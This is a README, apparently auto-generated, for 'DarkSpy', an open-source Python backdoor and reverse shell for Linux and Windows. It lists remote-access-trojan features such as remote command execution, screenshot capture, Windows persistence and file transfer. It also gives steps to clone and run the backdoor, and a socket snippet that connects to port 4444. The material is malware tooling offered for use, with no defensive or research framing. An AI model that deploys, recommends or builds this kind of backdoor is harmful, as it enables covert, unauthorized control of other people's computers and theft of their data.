# <center>DarkSpy</center>
*_One-Client Open Source Backdoor/Reverse-Shell For Both Linux And Windows Systems Written With Python3._*

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Made with Python](https://img.shields.io/badge/Made%20with-Python-blue.svg)](https://www.python.org/)
[![Stars](https://img.shields.io/github/stars/amaitou/DarkSpy?style=social)](https://github.com/amaitou/DarkSpy)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/amaitou/DarkSpy/pulls)

## ✨ Features
* Send commands to a client
* Capture screenshot
* Windows persistence
* Download files
* Upload files
* Get the current working directory
* Get the machine infos
* Download files over internet

## 🚀 Quick Start
To get started with DarkSpy, follow these steps:
```bash
# Clone the repository
git clone https://github.com/amaitou/DarkSpy

# Navigate to the repository
cd DarkSpy

# Install required libraries
pip3 install pyautogui

# Run the backdoor
python3 Backdoor.py
```
```python
# Example usage
import socket

# Create a socket object
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the server
s.connect(("0.0.0.0", 4444))
```

## 🧭 Project Structure
The project consists of the following files and directories:
* `Backdoor.py`: The backdoor script
* `Handler.py`: The handler script
* `README.md`: This file
* `LICENSE`: The license file
* `.gitignore`: The git ignore file

## 🛠️ Tech Stack
The project uses the following technologies:
| Technology | Version |
| --- | --- |
| Python | 3.6+ |
| PyAutoGUI | 0.9.50 |
| Socket |  |
| Platform |  |
| Subprocess |  |
| Shutil |  |
| Urllib |  |

## 🤝 Contributing
Contributions are welcome! If you'd like to contribute, please fork the repository and submit a pull request.

## 📄 License
DarkSpy is licensed under the MIT license. See the `LICENSE` file for more information.

---
<sub>🤖 Crafted by [**GIT MATE**](https://gitmate.app) — your AI git automator.</sub>
